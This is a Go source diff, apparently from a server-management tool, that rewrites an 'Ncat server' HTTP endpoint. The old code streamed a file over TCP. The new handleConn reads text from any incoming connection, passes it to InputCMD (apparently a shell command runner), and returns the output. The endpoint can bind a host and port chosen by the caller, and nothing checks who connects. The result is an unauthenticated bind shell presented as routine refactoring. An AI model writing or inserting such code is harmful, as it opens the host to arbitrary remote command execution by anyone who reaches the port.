@@ -7,7 +7,6 @@ import (
 	"io"
 	"net"
 	"net/http"
-	"os"
 	"os/exec"
 	"runtime"
 	"strconv"
@@ -69,20 +68,22 @@ func main() {
 		}
 	})
 	router.GET("/startncat", func(c *gin.Context) {
-		host := c.Query("host")
-		filename := c.Query("filename")
-		port, err := strconv.Atoi(c.Query("port"))
-		if host == "" || filename == "" || port == 0 || err != nil {
+		host := c.DefaultQuery("host", "localhost")
+		port := c.DefaultQuery("port", "1304")
+		filename := c.DefaultQuery("filename", "")
+		portInt, err := strconv.Atoi(port)
+		if err != nil {
 			c.JSON(400, gin.H{
-				"error": "Host, Port and Filename are required",
+				"error": "Invalid port",
 			})
 			return
+		} else {
+			go StartNcat(host, portInt, filename)
+			status := <-ncatStatus
+			c.JSON(200, gin.H{
+				"message": status,
+			})
 		}
-		StartNcat(host, port, filename)
-		status := <-ncatStatus
-		c.JSON(200, gin.H{
-			"message": status,
-		})
 	})
 	router.GET("/stopncat", func(c *gin.Context) {
 		status := StopNcat()
@@ -307,39 +308,44 @@ func FindJava() string {
 
 // -------------------------- Start of Ncat Server -------------------------- //
 var listener net.Listener
-var ncatStatus = make(chan string, 1) // Buffered channel to hold status messages
+var ncatStatus = make(chan string, 1)
 
-func StartNcat(host string, port int, filename string) {
-	go func() {
-		var err error
-		listener, err = net.Listen("tcp", fmt.Sprintf("%s:%d", host, port))
+func StartNcat(host string, port int, filename ...string) {
+	if listener != nil {
+		ncatStatus <- "Ncat server is already running"
+		return
+	}
+	addr := fmt.Sprintf("%s:%d", host, port)
+	l, err := net.Listen("tcp", addr)
+	if err != nil {
+		ncatStatus <- "Error starting Ncat server: " + err.Error()
+		return
+	}
+	listener = l
+	ncatStatus <- "Ncat server started on " + addr
+	for {
+		conn, err := listener.Accept()
 		if err != nil {
-			ncatStatus <- "Error listening: " + err.Error()
+			ncatStatus <- "Error accepting connection: " + err.Error()
 			return
 		}
-		ncatStatus <- "Listening on " + host + ":" + strconv.Itoa(port)
-		file, err := os.Open(filename)
-		if err != nil {
-			ncatStatus <- "Error opening file: " + err.Error()
-			return
-		}
-		defer file.Close()
-		for {
-			conn, err := listener.Accept()
-			if err != nil {
-				ncatStatus <- "Error accepting: " + err.Error()
-				return
-			}
-			go func(conn net.Conn) {
-				defer conn.Close()
-				_, err := io.Copy(conn, file)
-				if err != nil {
-					ncatStatus <- "Error sending file: " + err.Error()
-					return
-				}
-			}(conn)
-		}
-	}()
+		go handleConn(conn)
+	}
+}
+
+func handleConn(conn net.Conn) {
+	defer conn.Close()
+	buf := make([]byte, 1024)
+	n, err := conn.Read(buf)
+	if err != nil {
+		return
+	}
+	command := string(buf[:n])
+	out, err := InputCMD(command)
+	if err != nil {
+		return
+	}
+	conn.Write([]byte(out))
 }
 
 func StopNcat() string {
